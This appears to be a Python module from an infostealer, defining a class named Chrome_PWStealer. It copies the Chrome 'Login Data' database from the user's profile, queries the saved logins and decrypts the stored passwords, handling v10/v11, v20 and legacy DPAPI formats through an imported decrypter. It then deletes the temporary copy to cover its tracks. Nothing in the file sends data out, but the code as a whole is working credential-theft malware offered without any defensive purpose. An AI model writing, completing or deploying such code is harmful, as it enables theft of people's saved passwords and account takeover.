import os
import sqlite3
import shutil

from .password_decrypter import ChromePWDecrypter


class Chrome_PWStealer:
    def __init__(self,temp_path=""):
        # Db
        self.temp_path = temp_path
        self.filename_db = os.path.join(self.temp_path + "chrome_temp.db")
        self.decrypter = ChromePWDecrypter(self.filename_db) 
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
        self.rows = self.extract_and_decrypt_db_rows()
        os.remove(self.filename_db)

       
    # ENCRYPTION RELATED
    def decrypt_password(self, password):
        if not password:
            return "NoPasswordFound"
        try:
            # Check for v10/v11 encrypted password (starts with 'v10' or 'v11')
            if password.startswith(b'v10') or password.startswith(b'v11'):
                self.decrypter.decrypt_old(password)
            elif password.startswith(b'v20'):
                return self.decrypter.decrypt_new(password)
            else:
                # Try legacy DPAPI decryption (Chrome < v80)
                return self.decrypter.decrypt_default(password)
                
        except Exception as e:
            # Log the error for debugging (optional)
            # print(f"Decryption error: {str(e)}")
            return str(e)
    # DB RELATED
    def copy_db_to_filename(self):
        shutil.copyfile(self.db_path, self.filename_db)
    def extract_and_decrypt_db_rows(self):
        self.copy_db_to_filename()
        db = sqlite3.connect(self.filename_db)
        cursor = db.cursor()
        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        # iterate over all rows
        return [[x[0],x[2],self.decrypt_password(x[3])] for x in cursor.fetchall()]
    def get_passwords(self):
        return self.rows
    
if __name__ == "__main__":
    print("ok") 